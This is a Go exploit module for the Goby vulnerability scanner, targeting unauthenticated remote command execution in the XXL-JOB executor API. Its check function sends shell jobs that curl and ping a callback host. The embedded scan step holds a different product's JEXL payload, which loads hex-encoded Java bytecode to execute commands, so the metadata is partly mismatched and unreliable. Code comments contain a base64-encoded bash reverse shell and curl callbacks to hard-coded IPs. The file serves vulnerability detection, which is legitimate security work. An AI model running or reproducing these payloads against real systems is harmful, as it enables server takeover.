package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"time"
)

func init() {
	expJson := `{
    "Description": "<p>XXL-JOB is a distributed task scheduling platform. Its core design goals are rapid development, simple learning, lightweight, and easy expansion. Now it has open source code and access to online product lines of many companies, and access scenarios such as electricity Commercial business, O2O business and big data operations, etc.</p><p>XXL-JOB By default, the API interface of XXL-JOB is not configured with authentication measures. Unauthorized attackers can construct malicious requests, cause remote command execution, and directly control the server. There is no need to log in to exploit the vulnerability, and the actual risk is extremely high.</p>",
    "Product": "XXL-JOB",
    "Homepage": "http://www.xuxueli.com/",
    "DisclosureDate": "2020-10-28",
    "Author": "mahui@gobies.org",
    "FofaQuery": "body=\"invalid request, HttpMethod not support\" || body=\"invalid request, uri-mapping(/) not found.\"",
    "Level": "3",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "9.0",
    "VulType": [
        "Command Execution"
    ],
    "Impact": "<p>XXL-JOB By default, the API interface of XXL-JOB is not configured with authentication measures. Unauthorized attackers can construct malicious requests, cause remote command execution, and directly control the server. There is no need to log in to exploit the vulnerability, and the actual risk is extremely high.</p>",
    "Recommendation": "<p>1. Enable the authentication component that comes with XXL-JOB: search for \"xxl.job.accessToken\" in the official documentation, and enable it according to the documentation instructions.</p><p>To configure xxl.job.accessToken, please refer to the related link: <a href=\"https://www.xuxueli.com/xxl-job/?spm=a2c4g.11174386.n2.3.ea1f1051B1UUc1#5.10%20%E8%AE%BF%E9\">https://www.xuxueli.com/xxl-job/?spm=a2c4g.11174386.n2.3.ea1f1051B1UUc1#5.10%20%E8%AE%BF%E9</a> %97%AE%E4%BB%A4%E7%89%8C%EF%BC%88AccessToken%EF%BC%89</p><p>2. Port protection: Replace the default actuator port in time. It is not recommended to directly open the default 9999 port to the public network.</p><p>3. Port access restriction: Only the specified IP is allowed to access the 9999 port of the actuator by configuring the security group restriction.</p>",
    "References": [],
    "HasExp": false,
    "ExpParams": [
        {
            "Name": "AttackType",
            "Type": "select",
            "Value": "goby_shell_linux"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "set_variable": [
                    "cmd|define|text|dir"
                ],
                "method": "POST",
                "uri": "/service/extdirect",
                "follow_redirect": true,
                "header": {
                    "Proxy-Connection": "keep-alive",
                    "X-Requested-With": "XMLHttpRequest",
                    "X-Nexus-UI": "true",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36",
                    "Content-Type": "application/json",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9"
                },
                "data_type": "text",
                "data": "{\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [{\"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0, \"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"function(x, y, z, c, integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length()){       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\n    y,\\n   'Exploit.Test234',\\n    z.getBytes('latin1'),    0,\\n    3054\\n);x.getMethod('test', ''.class).invoke(null, '{{{cmd}}}');'done!'}\\n\"}, {\"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1}], \"method\": \"previewAssets\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bin",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "NOTICE.txt",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND"
    ],
    "Tags": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": [
            "XXL-JOB"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "GobyQuery": "body=\"invalid request, HttpMethod not support\" || body=\"invalid request, uri-mapping(/) not found.\"",
    "Translation": {
        "CN": {
            "Name": "XXL-JOB API 接口未授权致远程命令执行",
            "Product": "XXL-JOB",
            "Description": "<p>XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展，现已开放源代码并接入多家公司线上产品线，接入场景如电商业务，O2O业务和大数据作业等。</p><p>XXL-JOB默认情况下XXL-JOB的API接口没有配置认证措施，未授权的攻击者可构造恶意请求，造成远程执行命令，直接控制服务器。漏洞利用无需登录，实际风险极高。</p>",
            "Recommendation": "<p>1、开启 XXL-JOB 自带的鉴权组件：官方文档中搜索 “xxl.job.accessToken” ，按照文档说明启用即可。</p><p>配置 xxl.job.accessToken，可参考相关链接：<a href=\"https://www.xuxueli.com/xxl-job/?spm=a2c4g.11174386.n2.3.ea1f1051B1UUc1#5.10%20%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%EF%BC%88AccessToken%EF%BC%89\" target=\"_blank\">https://www.xuxueli.com/xxl-job/?spm=a2c4g.11174386.n2.3.ea1f1051B1UUc1#5.10%20%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%EF%BC%88AccessToken%EF%BC%89</a><br></p><p>2、端口防护：及时更换默认的执行器端口，不建议直接将默认的 9999 端口开放到公网。</p><p>3、端口访问限制：通过配置安全组限制只允许指定 IP 才能访问执行器 9999 端口。</p>",
            "Impact": "<p><span style=\"color: var(--primaryFont-color);\">XXL-JOB默认情况下XXL-JOB的API接口没有配置认证措施，未授权的攻击者可构造恶意请求，造成远程执行命令，直接控制服务器。漏洞利用无需登录，实际风险极高。</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "XXL-JOB API interface is not authorized to cause remote command execution",
            "Product": "XXL-JOB",
            "Description": "<p>XXL-JOB is a distributed task scheduling platform. Its core design goals are rapid development, simple learning, lightweight, and easy expansion. Now it has open source code and access to online product lines of many companies, and access scenarios such as electricity Commercial business, O2O business and big data operations, etc.</p><p>XXL-JOB By default, the API interface of XXL-JOB is not configured with authentication measures. Unauthorized attackers can construct malicious requests, cause remote command execution, and directly control the server. There is no need to log in to exploit the vulnerability, and the actual risk is extremely high.</p>",
            "Recommendation": "<p>1. Enable the authentication component that comes with XXL-JOB: search for \"xxl.job.accessToken\" in the official documentation, and enable it according to the documentation instructions.</p><p>To configure xxl.job.accessToken, please refer to the related link: <a href=\"https://www.xuxueli.com/xxl-job/?spm=a2c4g.11174386.n2.3.ea1f1051B1UUc1#5.10%20%E8%AE%BF%E9\" rel=\"nofollow\">https://www.xuxueli.com/xxl-job/?spm=a2c4g.11174386.n2.3.ea1f1051B1UUc1#5.10%20%E8%AE%BF%E9</a> %97%AE%E4%BB%A4%E7%89%8C%EF%BC%88AccessToken%EF%BC%89</p><p>2. Port protection: Replace the default actuator port in time. It is not recommended to directly open the default 9999 port to the public network.</p><p>3. Port access restriction: Only the specified IP is allowed to access the 9999 port of the actuator by configuring the security group restriction.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">XXL-JOB By default, the API interface of XXL-JOB is not configured with authentication measures. Unauthorized attackers can construct malicious requests, cause remote command execution, and directly control the server. There is no need to log in to exploit the vulnerability, and the actual risk is extremely high.</span><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "Name": "XXL-JOB API interface is not authorized to cause remote command execution",
    "PocId": "7441"
}`
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//如下有限定  基于windows powershell中的curl 和 linux中curl   若是其他环境就漏报了，java或其他包 需要xxl-job的单独构造

		//post 空data 报错识别

		//不能录入windows   本地搭建的环境测试  首先 curl只能没有路径的   base64编码后只能没有带？参数的      输入到文件不能执行  反弹的命令base64   不能执行 写入到文件也不能执行    环境老是出问题 很多都不确定sm导致的坏了
		//bash -c 'echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEwOS4xLzkyMDMgMD4mMQ==' |{base64,-d}|{bash,-i}
		//curl http://165.22.59.16/api/v1/poc_scan/c23dcbbdb083eb96   不成功    只有10.10.10.178:9011   这种没有后缀的 可以探测成功
		//对上面的进行  base64编码可以执行成功    bash -c 'echo Y3VybCBodHRwOi8vMTY1LjIyLjU5LjE2L2FwaS92MS9wb2Nfc2Nhbi9jMjNkY2JiZGIwODNlYjk2' |{base64,-d}|{bash,-i}
		//curl godserver 不能成功  使用上面的base64也不能成功，但是本地可以，url.QueryEscape编码了也不行
		//echo 'curl http://165.22.59.16/api/v1/poc_scan/c23dcbbdb083eb96' >/tmp/asdf&&sh /tmp/asdf

		//公网案例   是可以使用带路径的165测试 godserver ip测试通过  exp bash 反弹测试通过

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//token := strings.ToLower(goutils.RandomHexString(16))
			//checkUrl := foeye.GetFoeyeCheckURL(token)

			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			//if isDomain {
			//	cmd = "ping -c 1 " + checkUrl
			//}

			time1 := time.Now().Unix()
			data1 := "{\"jobId\":1,    \"executorHandler\":\"demoJobHandler\",\"executorParams\":\"demoJobHandler\",\"executorBlockStrategy\":\"COVER_EARLY\",\"executorTimeout\":0,\"logId\":1,        \"logDateTime\":" + strconv.FormatInt(time1, 10) + ",  \"glueType\":\"GLUE_SHELL\",\"glueSource\":\"curl http://" + checkUrl + "\", \"glueUpdatetime\":" + strconv.FormatInt(time1, 10) + ",\"broadcastIndex\":0,\"broadcastTotal\":0}"
			data2 := "{\"jobId\":1,    \"executorHandler\":\"demoJobHandler\",\"executorParams\":\"demoJobHandler\",\"executorBlockStrategy\":\"COVER_EARLY\",\"executorTimeout\":0,\"logId\":1,        \"logDateTime\":" + strconv.FormatInt(time1, 10) + ",  \"glueType\":\"GLUE_SHELL\",\"glueSource\":\"ping http://" + checkUrl + "\", \"glueUpdatetime\":" + strconv.FormatInt(time1, 10) + ",\"broadcastIndex\":0,\"broadcastTotal\":0}\""
			cfg1 := httpclient.NewPostRequestConfig("/run")
			cfg1.VerifyTls = false
			cfg1.Data = data1
			cfg1.Header.Store("Content-Type", "application/json;charset=UTF-8")
			_, _ = httpclient.DoHttpRequest(u, cfg1)
			//if err != nil {
			//	fmt.Println(err.Error())
			//	return false
			//}
			cfg2 := httpclient.NewPostRequestConfig("/run")
			cfg2.VerifyTls = false
			cfg2.Data = data2
			cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
			_, _ = httpclient.DoHttpRequest(u, cfg2)
			//if err2 != nil {
			//	fmt.Println(err.Error())
			//	return false
			//}
			//checkFlag := foeye.PullExists(token, time.Second*10)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		//exp 缺windows
		nil,
	))
}
